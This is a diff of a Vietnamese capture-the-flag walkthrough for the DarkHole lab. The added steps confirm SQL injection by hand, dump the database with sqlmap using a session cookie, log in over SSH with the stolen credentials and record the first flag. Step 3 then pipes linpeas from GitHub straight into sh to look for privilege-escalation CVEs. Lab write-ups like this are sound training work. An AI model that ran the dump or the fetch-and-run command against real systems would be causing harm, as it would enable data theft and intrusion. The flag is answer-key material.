@@ -50,7 +50,7 @@ Login thử, và boom !!!
 ![image](https://user-images.githubusercontent.com/97771705/225810568-da039043-7f20-4d31-a8e8-dcdea1b8eba0.png)
 
 ## Step 2
-Tại bước này cứ nghĩ là có IDOR vì change id=2,3,4 ... đều được hết. Nhưng không có cái trang nào là admin :(
+Tại bước này cứ nghĩ là có IDOR vì change id=2,3,4 ... đều được hết. Nhưng không có cái trang nào có thông tin nữa :(
 
 Thử 1 paylaod đơn giản xem có bị dính SQLi không
 
@@ -61,5 +61,42 @@ Khi order by 7 thì trang bị lỗi :) -> dính SQLi rồi
 ![image](https://user-images.githubusercontent.com/97771705/225812296-1ef5d23e-aba7-42f5-af85-db087c621dea.png)
 
 Sử dụng sqlmap để dò thôi :)
+
+> sqlmap -u "http://192.168.77.250/dashboard.php?id=1" --cookie="PHPSESSID=mm3m2qe16hm964aoqlq4kdkfe7" --dump
+
+(Dump sử dụng để truy xuất và lấy dữ liệu từ các bảng của cơ sở dữ liệu bằng cách thực hiện các truy vấn SQL thích hợp)
+
+Database là mysql 
+
+![image](https://user-images.githubusercontent.com/97771705/225816170-1f0cea10-8134-43c0-9e04-f274205db324.png)
+
+Có 2 cách khai thác là UNION attack và time based
+
+![image](https://user-images.githubusercontent.com/97771705/225816264-60bd7b1e-c82b-40f3-9e05-c3b3f1ae3f43.png)
+
+Database có 2 table, table user không có gì đặc biệt
+
+![image](https://user-images.githubusercontent.com/97771705/225816453-76f32182-3de2-4d07-9050-cf66475dde10.png)
+
+Nhưng tables ssh lại có username và pass để ssh 
+
+![image](https://user-images.githubusercontent.com/97771705/225816570-78f6e3a0-3cc4-427f-a1a1-d2ad1e0c1032.png)
+
+Thử ssh
+
+![image](https://user-images.githubusercontent.com/97771705/225816689-e22c661e-87a9-4b16-ac3b-d24c0b009d05.png)
+
+Flag đầu: DarkHole{'This_is_the_life_man_better_than_a_cruise'}
+
+![image](https://user-images.githubusercontent.com/97771705/225816888-e01d2566-1625-4aa0-b3e0-24dabf37afb3.png)
+
+## Step 3
+Sử dụng linpeas để check CVE. Command tại https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+Có 2 CVE.. thử từng cái một thôi :)
+
+![image](https://user-images.githubusercontent.com/97771705/225817364-0d66ed5f-1b25-4608-b666-2b0a6aa667c0.png)
 
 
